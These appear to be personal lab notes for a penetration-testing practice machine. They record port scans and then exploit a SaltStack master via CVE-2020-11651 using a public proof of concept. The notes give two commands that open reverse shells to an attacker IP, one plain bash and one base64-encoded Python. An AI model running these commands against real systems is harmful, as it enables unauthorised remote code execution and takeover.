Linux ttl=61

# rustscan

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
53/tcp open  domain  syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

# nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
8000/tcp open  http    nginx 1.16.1
```

### full nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
```

with full nmap got `4506` as well

# initial/priv esc

has only 1 user

just searched what I got from nmap

![[Pasted image 20240615131834.png]]

```
2020-11652 2020-11651  exploit
```

CVE search because other exploits were not working

![[Pasted image 20240615131937.png]]

https://github.com/jasperla/CVE-2020-11651-poc

### check ping back

checked with [[check rce cmd exe or get ping back]]

### root

```
python3 exploit.py --master 192.168.165.62 --exec "/bin/bash -i >& /dev/tcp/192.168.45.214/8000 0>&1"
```

![[Pasted image 20240615132337.png]]

### for base64

```
python3 exploit.py --master 192.168.165.62 --exec 'echo "cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC40NS4yMTQiLDgwMDApKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn" | base64 -d | /bin/sh'
```

[[base64 cmd exec]]